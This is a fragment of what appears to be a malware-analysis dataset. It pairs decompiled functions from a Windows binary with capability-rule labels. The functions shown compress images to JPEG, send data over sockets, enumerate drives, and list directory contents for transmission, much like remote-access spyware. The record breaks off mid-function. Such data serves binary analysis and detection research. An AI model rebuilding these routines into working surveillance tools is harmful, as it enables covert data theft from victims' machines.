        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00407085(char *param_1, uint *param_2, uint32_t param_3, uint32_t param_4, uint32_t param_5, char param_6)\n\n{\n    int32_t iVar1;\n    ushort uStack92;\n    ushort uStack90;\n    ushort uStack88;\n    uint uStack86;\n    uchar uStack81;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint16_t uStack58;\n    uint16_t uStack56;\n    uint8_t uStack53;\n    int32_t iStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint8_t uStack25;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    if (*0x421008 != param_5) {\n        *0x421008 = param_5;\n        fcn.00405e0d();\n        fcn.00405e79();\n        fcn.004061df();\n        fcn.00406257();\n        fcn.00406385();\n    }\n    *0x421004 = 0;\n    iStack20 = 1;\n    iStack24 = 2;\n    if (*0x421b00 == 0) {\n        *0x421b00 = sub.msvcrt.dll_malloc(0xffff);\n        if (*0x421b00 == 0) {\n            return 0;\n        }\n        *0x421b04 = *0x421b00 + 0x7fff;\n    }\n    if (*0x421b08 == 0) {\n        *0x421b08 = sub.msvcrt.dll_malloc(0x3fffc);\n        if (*0x421b08 == 0) {\n            return 0;\n        }\n        *0x421b0c = *0x421b08 + 0x1fffc;\n    }\n    for (uStack25 = 1; uStack25 < 0x10; uStack25 = uStack25 + 1) {\n        for (iStack16 = iStack20; iStack16 < iStack24; iStack16 = iStack16 + 1) {\n            *(*0x421b04 + iStack16) = uStack25;\n            *(iStack16 * 4 + *0x421b0c) = uStack25;\n            *(iStack16 * 4 + *0x421b0c + 2) = iStack16;\n        }\n        iStack16 = -iStack24;\n        while (iStack16 = iStack16 + 1,  iStack16 <= -iStack20) {\n            *(*0x421b04 + iStack16) = uStack25;\n            *(iStack16 * 4 + *0x421b0c) = uStack25;\n            *(*0x421b0c + iStack16 * 4 + 2) = iStack16 + iStack24 + -1;\n        }\n        iStack20 = iStack20 << 1;\n        iStack24 = iStack24 << 1;\n    }\n    if (((*param_1 == 'B') && (param_1[1] == 'M')) && (param_1[0x1c] == '\\x18')) {\n        *0x427200 = param_3;\n        *0x427202 = param_4;\n        if ((param_3 & 7) == 0) {\n            uStack32 = param_3 & 0xffff;\n        }\n        else {\n            uStack32 = (((param_3 & 0xffff) >> 3) + 1) * 8;\n        }\n        if ((param_4 & 7) == 0) {\n            uStack36 = param_4 & 0xffff;\n        }\n        else {\n            uStack36 = (((param_4 & 0xffff) >> 3) + 1) * 8;\n        }\n        iStack64 = uStack32 * uStack36 * 3;\n        if ((*0x424124 != iStack64) || (*0x424120 == 0)) {\n            *0x424124 = iStack64;\n            if (*0x424120 != 0) {\n                fcn.0040b4bf(0x424120);\n            }\n            *0x424120 = sub.msvcrt.dll_malloc(iStack64);\n            if (*0x424120 == 0) {\n                return 0;\n            }\n        }\n        iVar1 = *0x424120;\n        uStack68 = param_3 * -3 & 3;\n        iStack48 = 0;\n        iStack52 = 0;\n        iStack72 = *0x424120;\n        for (iStack44 = 0; iStack44 < param_4; iStack44 = iStack44 + 1) {\n            for (iStack40 = 0; iStack40 < param_3; iStack40 = iStack40 + 1) {\n                *(*0x424120 + iStack48 * 3) = param_1[iStack52 + 0x36];\n                *(*0x424120 + iStack48 * 3 + 1) = param_1[iStack52 + 0x37];\n                *(*0x424120 + iStack48 * 3 + 2) = param_1[iStack52 + 0x38];\n                iStack48 = iStack48 + 1;\n                iStack52 = iStack52 + 3;\n            }\n            iStack52 = iStack52 + uStack68;\n        }\n        if (param_6 != '\\0') {\n            for (iStack44 = 0; iStack44 < param_4 >> 1; iStack44 = iStack44 + 1) {\n                iStack76 = iVar1 + iStack44 * param_3 * 3;\n                iStack80 = iVar1 + ((param_4 - 1) - iStack44) * param_3 * 3;\n                for (iStack40 = 0; iStack40 < param_3 * 3; iStack40 = iStack40 + 1) {\n                    uStack81 = *(iStack76 + iStack40);\n                    *(iStack40 + iStack76) = *(iStack80 + iStack40);\n                    *(iStack40 + iStack80) = uStack81;\n                }\n            }\n        }\n        *0x421000 = sub.msvcrt.dll_malloc(*param_2);\n        if (*0x421000 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            *0x41e300 = *0x427200;\n            *0x41e2fe = *0x427202;\n            fcn.00405d3b(0xffd8);\n            fcn.00405d3b(*0x41e2e4);\n            fcn.00405d3b(*0x41e2e6);\n            fcn.00405d0c(0x4a);\n            fcn.00405d0c(0x46);\n            fcn.00405d0c(0x49);\n            fcn.00405d0c(0x46);\n            fcn.00405d0c(0);\n            fcn.00405d0c(*0x41e2ed);\n            fcn.00405d0c(*0x41e2ee);\n            fcn.00405d0c(*0x41e2ef);\n            fcn.00405d3b(*0x41e2f0);\n            fcn.00405d3b(*0x41e2f2);\n            fcn.00405d0c(*0x41e2f4);\n            fcn.00405d0c(*0x41e2f5);\n            fcn.00405d3b(*0x421020);\n            fcn.00405d3b(*0x421022);\n            fcn.00405d0c(*0x421024);\n            for (uStack53 = 0; uStack53 < 0x40; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x421025));\n            }\n            fcn.00405d0c(*0x421065);\n            for (uStack53 = 0; uStack53 < 0x40; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x421066));\n            }\n            fcn.00405d3b(*0x41e2f8);\n            fcn.00405d3b(*0x41e2fa);\n            fcn.00405d0c(*0x41e2fc);\n            fcn.00405d3b(*0x41e2fe);\n            fcn.00405d3b(*0x41e300);\n            fcn.00405d0c(*0x41e302);\n            fcn.00405d0c(*0x41e303);\n            fcn.00405d0c(*0x41e304);\n            fcn.00405d0c(*0x41e305);\n            fcn.00405d0c(*0x41e306);\n            fcn.00405d0c(*0x41e307);\n            fcn.00405d0c(*0x41e308);\n            fcn.00405d0c(*0x41e309);\n            fcn.00405d0c(*0x41e30a);\n            fcn.00405d0c(*0x41e30b);\n            fcn.00405d3b(*0x4210c0);\n            fcn.00405d3b(*0x4210c2);\n            fcn.00405d0c(*0x4210c4);\n            for (uStack53 = 0; uStack53 < 0x10; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4210c5));\n            }\n            for (uStack53 = 0; uStack53 < 0xc; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4210d5));\n            }\n            fcn.00405d0c(*0x4210e1);\n            for (uStack53 = 0; uStack53 < 0x10; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4210e2));\n            }\n            for (uStack53 = 0; uStack53 < 0xa2; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4210f2));\n            }\n            fcn.00405d0c(*0x421194);\n            for (uStack53 = 0; uStack53 < 0x10; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x421195));\n            }\n            for (uStack53 = 0; uStack53 < 0xc; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4211a5));\n            }\n            fcn.00405d0c(*0x4211b1);\n            for (uStack53 = 0; uStack53 < 0x10; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4211b2));\n            }\n            for (uStack53 = 0; uStack53 < 0xa2; uStack53 = uStack53 + 1) {\n                fcn.00405d0c(*(uStack53 + 0x4211c2));\n            }\n            fcn.00405d3b(*0x41e30c);\n            fcn.00405d3b(*0x41e30e);\n            fcn.00405d0c(*0x41e310);\n            fcn.00405d0c(*0x41e311);\n            fcn.00405d0c(*0x41e312);\n            fcn.00405d0c(*0x41e313);\n            fcn.00405d0c(*0x41e314);\n            fcn.00405d0c(*0x41e315);\n            fcn.00405d0c(*0x41e316);\n            fcn.00405d0c(*0x41e317);\n            fcn.00405d0c(*0x41e318);\n            fcn.00405d0c(*0x41e319);\n            *0x421264 = 0;\n            *0x41e31a = '\\a';\n            uStack88 = 0;\n            uStack90 = 0;\n            uStack92 = 0;\n            for (uStack58 = 0; uStack58 < *0x427202; uStack58 = uStack58 + 8) {\n                for (uStack56 = 0; uStack56 < *0x427200; uStack56 = uStack56 + 8) {\n                    fcn.00406eef(uStack56, uStack58);\n                    fcn.00406c9c(0x424140, 0x423f20, &uStack88, 0x421280, 0x421300);\n                    fcn.00406c9c(0x424180, 0x424020, &uStack90, 0x4212c0, 0x421700);\n                    fcn.00406c9c(0x4241c0, 0x424020, &uStack92, 0x4212c0, 0x421700);\n                }\n            }\n            if (-1 < *0x41e31a) {\n                uStack86 = CONCAT22((1 << (*0x41e31a + 1U & 0x1f)) + -1, uStack86 & 0xff00 | *0x41e31a + 1);\n                fcn.00406043(uStack86);\n            }\n            fcn.00405d3b(0xffd9);\n            *param_2 = *0x421004;\n            iVar1 = *0x421000;\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 3317
    },
    "00407c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.00407c90(uint32_t param_1, ushort *param_2)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    \n    iVar2 = sub.WS2_32.dll_gethostbyname(param_1);\n    if (iVar2 != 0) {\n        fcn.0041a59f(param_2, 0, 0x10);\n        *param_2 = 2;\n        *(param_2 + 2) = ***(iVar2 + 0xc);\n        uVar1 = sub.WS2_32.dll_htons(param_1 & 0xffff);\n        *(param_1 + 2) = uVar1;\n    }\n    return iVar2 != 0;\n}\n",
        "token_count": 161
    },
    "004086b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004086b4(uint param_1, int32_t *param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 1) {\n        uVar2 = fcn.00408090(param_1, param_3, param_4);\n    }\n    else if (iVar1 == 0) {\n        uVar2 = fcn.00407e3e(param_1, param_3, param_4);\n    }\n    else if (iVar1 == 2) {\n        uVar2 = fcn.0040832e(param_1, param_3, param_4);\n    }\n    else if (iVar1 == 3) {\n        uVar2 = fcn.004085a0(param_1, param_3, param_4);\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 223
    },
    "00408b8f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00408b8f(uchar param_1, uint param_2, int32_t param_3, int32_t param_4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    uint32_t uStack32;\n    \n    if (param_3 == 0) {\n        param_4 = 0;\n    }\n    else if (param_4 == -1) {\n        param_4 = sub.msvcrt.dll_strlen(param_3);\n    }\n    uVar2 = param_4 + 5;\n    sub.KERNEL32.dll_EnterCriticalSection(0x42430c);\n    cVar1 = fcn.00408dd9(unaff_retaddr, 0x2d);\n    if (cVar1 != '\\0') {\n        if (*0x424324 < uStack32) {\n            if (*0x424328 != NULL) {\n                fcn.0040b4bf(0x424328);\n            }\n            *0x424328 = sub.msvcrt.dll_malloc(uStack32);\n            *0x424324 = uStack32;\n        }\n        if (*0x424328 != NULL) {\n            if (0 < param_3) {\n                if (unaff_retaddr == *0x41e7c8) {\n                    fcn.004057d1(0x4272a0, 0x427280, param_2, *0x424328 + 5, param_3, 0);\n                }\n                else {\n                    fcn.0041a5e1(*0x424328 + 5, param_2, param_3);\n                }\n            }\n            **0x424328 = param_3 + 1;\n            *(*0x424328 + 1) = param_1;\n            while (uVar2 < uStack32) {\n                iVar3 = sub.WS2_32.dll_send(unaff_retaddr, *0x424328 + uVar2, uVar2, 0);\n                if (iVar3 == -1) {\n                    iVar3 = fcn.00407c84();\n                    if (iVar3 != 0x2733) break;\n                    fcn.0040b294();\n                }\n            }\n        }\n    }\n    sub.KERNEL32.dll_LeaveCriticalSection(0x42430c);\n    if (uVar2 == 0) {\n        param_4 = -1;\n    }\n    else if (uVar2 == 0xffffffff) {\n        param_4 = -1;\n    }\n    return param_4;\n}\n",
        "token_count": 571
    },
    "00408d8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00408d8a(int32_t *param_1)\n\n{\n    uint *puStack8;\n    uint *puStack4;\n    \n    if (param_1 != NULL) {\n        if (-1 < *param_1) {\n            sub.WS2_32.dll_shutdown(*param_1, 2);\n            sub.WS2_32.dll_closesocket(*puStack4);\n        }\n        *puStack8 = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00408dd9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408df4)\n// WARNING: Removing unreachable block (ram,0x00408e0a)\n\nuint32_t fcn.00408dd9(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iStack288;\n    uint uStack284;\n    uint uStack280;\n    int32_t iStack276;\n    int32_t iStack40;\n    uint uStack16;\n    int32_t iStack12;\n    \n    while( true ) {\n        uStack16 = 0;\n        iStack276 = param_1;\n        uStack16 = 0;\n        uStack280 = 1;\n        iStack288 = param_2;\n        uStack284 = 0;\n        if (param_2 == 0) {\n            iStack40 = sub.WS2_32.dll_select(param_1 + 1, 0, &uStack280, 0, 0);\n        }\n        else {\n            iStack40 = sub.WS2_32.dll_select(param_1 + 1, 0, &uStack280, 0, &iStack288);\n        }\n        if (iStack40 != 0) break;\n        if (iStack12 != 0) {\n            return 0;\n        }\n    }\n    if (iStack40 < 0) {\n        return 0;\n    }\n    uVar1 = sub.WS2_32.dll___WSAFDIsSet();\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 350
    },
    "00408f43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408f69)\n// WARNING: Removing unreachable block (ram,0x00408f7f)\n\nuint32_t fcn.00408f43(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    int32_t iStack280;\n    int32_t iStack44;\n    int32_t iStack36;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 3;\n    while( true ) {\n        while( true ) {\n            uStack20 = 0;\n            iStack280 = param_1;\n            uStack20 = 0;\n            uStack284 = 1;\n            uStack292 = 0xf;\n            uStack288 = 0;\n            iStack44 = sub.WS2_32.dll_select(param_1 + 1, &uStack284, 0, 0, &uStack292);\n            if (iStack44 != 0) {\n                if (iStack44 < 0) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = sub.WS2_32.dll___WSAFDIsSet();\n                    uVar2 = uVar2 & 0xffffff00 | uVar2 != 0;\n                }\n                return uVar2;\n            }\n            if (iStack36 == 0) break;\n            iStack36 = iStack36 + -1;\n        }\n        iVar1 = fcn.00408b8f();\n        if (iVar1 == -1) break;\n        iStack36 = 3;\n    }\n    fcn.00408d8a();\n    return 0;\n}\n",
        "token_count": 389
    },
    "0040913f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0040913f(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    if (param_1 == -1) {\n        uVar2 = 0;\n    }\n    else {\n        iStack16 = 0;\n        uStack20 = 0;\n        uStack24 = param_3;\n        while (((uStack20 < param_3 && (-1 < iStack16)) && (cVar1 = fcn.00408f43(param_1),  cVar1 == '\\x01'))) {\n            iStack16 = fcn.004090c2(param_1, uStack20 + param_2, uStack24);\n            uStack24 = uStack24 - iStack16;\n            uStack20 = uStack20 + iStack16;\n        }\n        uVar2 = uStack20 & 0xffffff00 | uStack20 == param_3;\n    }\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "004091dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004091dc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_EDI;\n    uchar auStack832 [8];\n    uchar auStack824 [12];\n    char acStack812 [8];\n    uint auStack804 [2];\n    uchar auStack796 [16];\n    uchar auStack780 [16];\n    uchar auStack764 [16];\n    uchar auStack748 [16];\n    uchar auStack732 [32];\n    char acStack700 [8];\n    uchar auStack692 [120];\n    uint auStack572 [3];\n    uchar auStack560 [460];\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack76;\n    int32_t iStack44;\n    \n    fcn.004195d4(auStack560, 0x8000);\n    sub.KERNEL32.dll_SetErrorMode(1);\n    iVar1 = sub.KERNEL32.dll_GetLogicalDriveStringsA(0x80, auStack692);\n    if (iVar1 != 0) {\n        iStack44 = 0;\n        while (acStack700[iStack44] != '\\0') {\n            fcn.0041a59f(auStack764, 0, 0x40);\n            fcn.0041a59f(auStack780, 0, 0x10);\n            auStack804[0] = 0;\n            iVar1 = sub.KERNEL32.dll_GetVolumeInformationA\n                              (acStack700 + iStack44, auStack764, 0x40, 0, 0, auStack804, auStack780, 0x10);\n            if (iVar1 == 0) {\n                fcn.0041a59f(auStack796, 0, 0x40);\n                fcn.0041a59f(acStack812, 0, 0x10);\n            }\n            sub.KERNEL32.dll_GetDiskFreeSpaceExA(auStack732 + iStack76, auStack824, auStack832, 0);\n            if (acStack812[0] == '\\0') {\n                uVar2 = fcn.0040b60e(\"mWYCi a46w\");\n                fcn.00419918(acStack812, uVar2, 0x40);\n            }\n            sub.KERNEL32.dll_GetDriveTypeA(auStack748 + iStack92);\n            iStack100 = fcn.00419fa8();\n            if (0 < iStack100) {\n                fcn.0041972e();\n            }\n            iStack96 = iStack96 + 4;\n        }\n    }\n    iVar1 = fcn.00419910(auStack572);\n    if (iVar1 < 1) {\n        fcn.00408b8f(unaff_EDI, 0xe9, 0, 0);\n    }\n    else {\n        uVar2 = fcn.00419910(auStack572);\n        fcn.00408b8f(unaff_EDI, 0xe8, auStack572[0], uVar2);\n    }\n    fcn.00419639(auStack572);\n    return;\n}\n",
        "token_count": 702
    },
    "004095ed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004095ed(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_ESI;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint unaff_retaddr;\n    uchar uStack1014;\n    uchar uStack1013;\n    uchar uStack1012;\n    uchar uStack1011;\n    uchar uStack1010;\n    uchar uStack1009;\n    uchar uStack1008;\n    uchar uStack1007;\n    uchar uStack1006;\n    uchar uStack1005;\n    uchar uStack1004;\n    uchar uStack1003;\n    uchar uStack1002;\n    uchar uStack1001;\n    uchar uStack1000;\n    uchar uStack999;\n    uchar uStack998;\n    uchar uStack997;\n    uchar uStack996;\n    uchar uStack995;\n    uchar uStack994;\n    uchar uStack993;\n    uchar uStack992;\n    uchar uStack991;\n    uchar uStack990;\n    uchar uStack989;\n    uchar uStack988;\n    uchar uStack987;\n    uchar uStack986;\n    uchar uStack985;\n    uchar uStack984;\n    uchar uStack983;\n    uchar uStack982;\n    uchar uStack981;\n    uchar uStack980;\n    uchar uStack979;\n    uchar uStack978;\n    uchar uStack977;\n    uchar uStack976;\n    uchar uStack975;\n    uchar uStack974;\n    uchar uStack973;\n    uchar uStack972;\n    uchar uStack971;\n    uchar uStack970;\n    uchar uStack969;\n    uchar uStack968;\n    uchar uStack967;\n    uchar uStack966;\n    uchar uStack965;\n    uchar uStack964;\n    uchar uStack963;\n    uchar uStack962;\n    uchar uStack961;\n    ushort uStack960;\n    ushort uStack958;\n    ushort uStack954;\n    uint16_t uStack952;\n    uint16_t uStack950;\n    uint16_t uStack948;\n    uint32_t auStack944 [4];\n    uchar auStack928 [12];\n    uint uStack916;\n    uint uStack912;\n    uchar auStack900 [276];\n    uint uStack624;\n    uint uStack620;\n    uchar auStack612 [8];\n    uchar auStack604 [4];\n    uchar auStack600 [8];\n    uchar auStack592 [4];\n    uchar auStack588 [32];\n    uchar auStack556 [516];\n    uint uStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack16;\n    \n    uStack16 = 0;\n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iStack32 = sub.KERNEL32.dll_FindFirstFileA(unaff_retaddr, auStack928);\n    if (iStack32 == -1) {\n        fcn.00408b8f(*(unaff_ESI + 0x208), *(unaff_ESI + 0x205), 0, 0);\n    }\n    else {\n        cVar1 = fcn.004195d4(auStack592, 0x8000);\n        if ((cVar1 == '\\x01') && (cVar1 = fcn.004195d4(auStack604, 0x8000),  cVar1 == '\\x01')) {\n            do {\n                sub.KERNEL32.dll_FileTimeToSystemTime(&uStack916, &uStack952);\n                uStack988 = 0x25;\n                uStack987 = 0x2e;\n                uStack986 = 0x32;\n                uStack985 = 100;\n                uStack984 = 0x2f;\n                uStack983 = 0x25;\n                uStack982 = 0x2e;\n                uStack981 = 0x32;\n                uStack980 = 100;\n                uStack979 = 0x2f;\n                uStack978 = 0x25;\n                uStack977 = 100;\n                uStack976 = 0x20;\n                uStack975 = 0x25;\n                uStack974 = 0x2e;\n                uStack973 = 0x32;\n                uStack972 = 100;\n                uStack971 = 0x3a;\n                uStack970 = 0x25;\n                uStack969 = 0x2e;\n                uStack968 = 0x32;\n                uStack967 = 100;\n                uStack966 = 0x3a;\n                uStack965 = 0x25;\n                uStack964 = 0x2e;\n                uStack963 = 0x32;\n                uStack962 = 100;\n                uStack961 = 0;\n                uVar5 = uStack948;\n                uVar4 = uStack950;\n                uVar3 = uStack952;\n                fcn.00419fa8(auStack588, 0x20, &uStack988, uStack954, uStack958, uStack960, uVar3, uVar4, uVar5);\n                if ((auStack944[0] & 0x10) == 0) {\n                    uStack624 = uStack912;\n                    uStack620 = uStack916;\n                    uStack1014 = 0x25;\n                    uStack1013 = 100;\n                    uStack1012 = 7;\n                    uStack1011 = 0x25;\n                    uStack1010 = 0x73;\n                    uStack1009 = 7;\n                    uStack1008 = 0x25;\n                    uStack1007 = 0x49;\n                    uStack1006 = 0x36;\n                    uStack1005 = 0x34;\n                    uStack1004 = 0x75;\n                    uStack1003 = 7;\n                    uStack1002 = 0x25;\n                    uStack1001 = 0x73;\n                    uStack1000 = 7;\n                    uStack999 = 0;\n                    iStack36 = fcn.00419fa8(auStack556, 0x204, &uStack1014, auStack944[0], auStack900, uStack912, \n                                            uStack916, auStack588, uVar5);\n                    if (0 < iStack36) {\n                        fcn.0041972e(auStack600, auStack556, iStack36);\n                    }\n                }\n                else {\n                    uStack998 = 0x25;\n                    uStack997 = 100;\n                    uStack996 = 7;\n                    uStack995 = 0x25;\n                    uStack994 = 0x73;\n                    uStack993 = 7;\n                    uStack992 = 0x25;\n                    uStack991 = 0x73;\n                    uStack990 = 7;\n                    uStack989 = 0;\n                    iStack36 = fcn.00419fa8(auStack556, 0x204, &uStack998, auStack944[0], auStack900, auStack588, uVar3\n                                            , uVar4, uVar5);\n                    if (0 < iStack36) {\n                        fcn.0041972e(auStack612, auStack556, iStack36);\n                    }\n                }\n                iVar2 = sub.KERNEL32.dll_FindNextFileA(uStack40, auStack944);\n            } while (iVar2 != 0);\n            sub.KERNEL32.dll_FindClose();\n            cVar1 = fcn.004197d0();\n            if (cVar1 == '\\0') {\n                fcn.00408b8f();\n            }\n            else {\n                fcn.00419910();\n                fcn.00408b8f();\n            }\n            fcn.00419639();\n            fcn.00419639();\n        }\n    }\n    if (*(unaff_ESI + 0x20c) != '\\0') {\n        fcn.0040b4bf(&stack0xfffffff8);\n    }\n    return;\n}\n",
        "token_count": 1747
    },
    "00409abc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00409abc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    uint *puVar8;\n    uchar auStack16 [4];\n    int32_t aiStack12 [2];\n    \n    aiStack12[1] = 0x409ac7;\n    iVar2 = fcn.0041ce38();\n    iVar2 = -iVar2;\n    *(&stack0x000016a8 + iVar2) = 0;\n    *(&stack0xfffffffc + iVar2) = 0x8003;\n    *(&stack0xfffffff8 + iVar2) = 0x409ae0;\n    sub.KERNEL32.dll_SetErrorMode();\n    *(&stack0x00000004 + iVar2) = *(&stack0x000016b8 + iVar2);\n    *(&stack0x00000000 + iVar2) = 0x41ecb4;\n    *(&stack0xfffffffc + iVar2) = 0x204;\n    *(&stack0xfffffff8 + iVar2) = &stack0x0000149c + iVar2;\n    *(&stack0xfffffff4 + iVar2) = 0x409b0d;\n    iVar3 = fcn.00419fa8();\n    if (-1 < iVar3) {\n        *(&stack0xfffffffc + iVar2) = &stack0x00000350 + iVar2;\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000149c + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x409b2f;\n        uVar4 = sub.KERNEL32.dll_FindFirstFileA();\n        puVar8 = &stack0xfffffff0 + iVar2;\n        *(&stack0x00001698 + iVar2) = uVar4;\n        ppiVar6 = &stack0xfffffff0 + iVar2;\n        if (*(&stack0x00001698 + iVar2) != -1) {\n            do {\n                ppiVar7 = ppiVar6;\n                if (*0x42432c == 0) break;\n                ppiVar6[1] = 0x41ecb8;\n                *ppiVar6 = ppiVar6 + 0xe1;\n                ppiVar6[-1] = 0x409b6e;\n                iVar2 = fcn.0041a1d8();\n                if (iVar2 != 0) {\n                    ppiVar6[1] = 0x41ecba;\n                    *ppiVar6 = ppiVar6 + 0xe1;\n                    ppiVar6[-1] = 0x409b90;\n                    iVar2 = fcn.0041a1d8();\n                    if (iVar2 != 0) {\n                        ppiVar6[1] = ppiVar6 + 0xe1;\n                        *ppiVar6 = ppiVar6[0x5b0] + 0x81;\n                        ppiVar6[-1] = 0x409bba;\n                        cVar1 = fcn.0041a27e();\n                        if (cVar1 == '\\0') {\ncode_r0x00409dfb:\n                            if ((ppiVar6[0xd6] & 0x10) != 0) {\n                                ppiVar6[2] = 0x104;\n                                ppiVar6[1] = ppiVar6[0x5b0] + 0x81;\n                                *ppiVar6 = ppiVar6 + 0x8b;\n                                ppiVar6[-1] = 0x409e36;\n                                fcn.00419918();\n                                ppiVar6[4] = ppiVar6 + 0xe1;\n                                ppiVar6[3] = ppiVar6[0x5b0];\n                                ppiVar6[2] = 0x41ecbd;\n                                ppiVar6[1] = 0x204;\n                                *ppiVar6 = ppiVar6 + 10;\n                                ppiVar6[-1] = 0x409e6b;\n                                fcn.00419fa8();\n                                ppiVar6[0xcc] = ppiVar6[0x5b0][0xc2] + 1;\n                                ppiVar6[0xcd] = ppiVar6[0x5b0][0xc3];\n                                *ppiVar6 = ppiVar6 + 10;\n                                ppiVar6[-1] = 0x409ea2;\n                                fcn.00409abc();\n                            }\n                        }\n                        else if ((ppiVar6[0xd6] & 0x10) == 0) {\n                            ppiVar6[0x126] = ppiVar6[0xde];\n                            ppiVar6[0x127] = ppiVar6[0xdd];\n                            *(ppiVar6 + 0x33e) = 0x25;\n                            *(ppiVar6 + 0x33f) = 100;\n                            *(ppiVar6 + 0xd0) = 7;\n                            *(ppiVar6 + 0x341) = 0x25;\n                            *(ppiVar6 + 0x342) = 0x73;\n                            *(ppiVar6 + 0x343) = 7;\n                            *(ppiVar6 + 0xd1) = 0x25;\n                            *(ppiVar6 + 